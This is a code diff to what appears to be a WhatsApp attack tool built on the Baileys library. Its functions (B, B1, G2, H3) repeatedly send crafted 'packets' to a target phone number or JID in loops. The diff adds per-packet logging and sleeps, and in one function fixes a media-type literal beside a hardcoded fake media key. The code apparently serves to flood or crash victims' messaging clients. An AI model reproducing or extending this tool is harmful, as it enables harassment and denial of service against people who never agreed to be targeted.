@@ -1,7 +1,3 @@
-const { getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion } = require("@whiskeysockets/baileys");
-const crypto = require('crypto')
-
-
 function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
@@ -83,6 +79,7 @@ async function B(sock, target) {
                 },
             ],
         });
+        console.log(`${i} B Packet To ${target}`)
         await sleep(1000)
     }
 }
@@ -91,7 +88,7 @@ async function B1(sock, jid) {
     let parse = true;
     let SID = "5e03e0&mms3";
     let key = "10000000_2012297619515179_5714769099548640934_n.enc";
-    let type = image / webp;
+    let type = `image / webp`;
     if (11 > 9) {
         parse = parse ? false : true;
     }
@@ -176,6 +173,7 @@ async function B1(sock, jid) {
                 },
             ],
         });
+        console.log(`${i} B1 Packet To ${jid}`)
         await sleep(1000)
     }
 }
@@ -277,6 +275,8 @@ async function G2(sock, isTarget, mention) {
                 }]
             });
         }
+        console.log(`${i} G2 Packet To ${isTarget}`)
+        await sleep(1000)
     }
 }
 
@@ -395,6 +395,9 @@ async function H3(sock, targetNumber) {
                 },
                 {}
             );
+            
+        console.log(`${i} H3 Packet To ${targetNumber}`)
+        await sleep(1000)
         }
     } catch (err) {
         console.log(err);
